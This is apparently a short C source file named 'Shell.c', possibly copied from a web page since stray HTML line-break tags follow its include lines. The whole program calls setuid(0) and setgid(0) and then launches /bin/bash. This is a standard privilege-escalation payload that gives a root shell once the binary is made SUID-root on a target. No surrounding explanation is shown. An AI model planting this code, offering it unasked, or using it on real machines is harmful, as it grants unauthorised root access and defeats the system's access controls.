# Shell.c

#include <stdio.h>  <br>
#include <sys/types.h> <br>
#include <unistd.h> <br>
#include <stdlib.h> <br>

int main(void) <br>
{
  setuid(0); setgid(0); system("/bin/bash");
}
